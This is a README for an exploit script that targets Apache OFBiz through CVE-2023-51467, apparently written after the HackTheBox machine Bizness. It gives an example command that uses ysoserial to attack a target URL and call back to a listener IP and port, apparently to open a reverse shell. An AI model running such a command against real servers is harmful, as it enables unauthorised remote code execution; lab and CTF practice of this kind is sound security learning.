# BadBizness
Automatic exploitation script for the Java web framework [OF Biz](https://ofbiz.apache.org/) under CVE-2023-51467. Inspired by the HackTheBox machine [Bizness](https://app.hackthebox.com/machines/582).

## Usage and Example
Script syntax is:
```
python3 badbizness.py [path to ysoserial-all.jar] [TARGET BASE URL] [LISTENER IP] [LISTENER PORT]

python3 badbizness.py /home/twopoint/ysoserial-all.jar http://example.com:1337 10.10.10.10. 1337
```
This script also requires the tool [ysoserial](https://github.com/frohoff/ysoserial/releases) and OpenJDK version 11.
